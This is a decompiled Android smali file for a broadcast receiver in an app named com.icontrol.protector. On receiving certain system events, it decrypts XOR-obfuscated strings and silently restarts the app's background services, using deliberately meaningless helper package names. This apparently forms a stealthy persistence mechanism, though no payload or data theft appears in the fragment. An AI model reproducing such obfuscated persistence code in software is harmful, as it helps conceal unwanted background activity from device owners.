.class public Lcom/icontrol/protector/ResetServices;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static synthetic a(Landroid/content/Intent;Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/icontrol/protector/ResetServices;->b(Landroid/content/Intent;Landroid/content/Context;)V

    return-void
.end method

.method private static synthetic b(Landroid/content/Intent;Landroid/content/Context;)V
    .locals 3

    .line 1
    invoke-virtual {p0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    const/16 v0, 0x21

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v0, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/hm;->a(Landroid/content/Context;)V

    const/16 p0, 0xd

    new-array p0, p0, [B

    fill-array-data p0, :array_2

    new-array v0, v1, [B

    fill-array-data v0, :array_3

    invoke-static {p0, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xe

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, p0, v0}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    sget-object p0, Lntidisestablish/neumonoul/floccinaucinih/ab;->P:Ljava/lang/String;

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, p0, v0}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const-class p0, Lcom/icontrol/protector/WorkServices;

    invoke-static {p1, p0}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    const/16 v1, 0x1a

    if-nez v0, :cond_2

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1, p0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p0, v1, :cond_1

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/p1;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_0

    :cond_1
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_2
    :goto_0
    new-instance p0, Landroid/content/Intent;

    const-class v0, Lcom/icontrol/protector/EngineWorker;

    invoke-direct {p0, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_4

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v1, :cond_3

    invoke-static {p1, p0}, Lntidisestablish/neumonoul/floccinaucinih/p1;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_1

    :cond_3
    invoke-virtual {p1, p0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_4
    :goto_1
    return-void

    :array_0
    .array-data 1
        -0x52t
        0x72t
        -0x55t
        -0x2et
        -0x35t
        0x40t
        -0x1et
        0x78t
        -0x5at
        0x72t
        -0x45t
        -0x3bt
        -0x36t
        0x5dt
        -0x58t
        0x37t
        -0x54t
        0x68t
        -0x5at
        -0x31t
        -0x36t
        0x7t
        -0x3ct
        0x17t
        -0x65t
        0x48t
        -0x76t
        -0xet
        -0x3t
        0x76t
        -0x36t
        0x19t
        -0x68t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x31t
        0x1ct
        -0x31t
        -0x60t
        -0x5ct
        0x29t
        -0x7at
        0x56t
    .end array-data

    :array_2
    .array-data 1
        -0x70t
        0x1at
        -0x3ct
        0x15t
        0x56t
        0x17t
        0x3et
        -0x70t
        -0x7ft
        0xft
        -0x2ft
        0x15t
        0x56t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x2et
        0x7bt
        -0x50t
        0x61t
        0x33t
        0x65t
        0x47t
        -0x50t
    .end array-data

    :array_4
    .array-data 1
        -0x6ft
        -0x2bt
        -0x5dt
        0x11t
        0x3at
        -0x1at
        -0x70t
        0x3ct
        -0x46t
        -0x39t
        -0x9t
        0x9t
        0x30t
        -0x1dt
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x2dt
        -0x4ct
        -0x29t
        0x65t
        0x5ft
        -0x6ct
        -0x17t
        0x1ct
    .end array-data
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lntidisestablish/neumonoul/floccinaucinih/ux;

    invoke-direct {v1, p2, p1}, Lntidisestablish/neumonoul/floccinaucinih/ux;-><init>(Landroid/content/Intent;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method
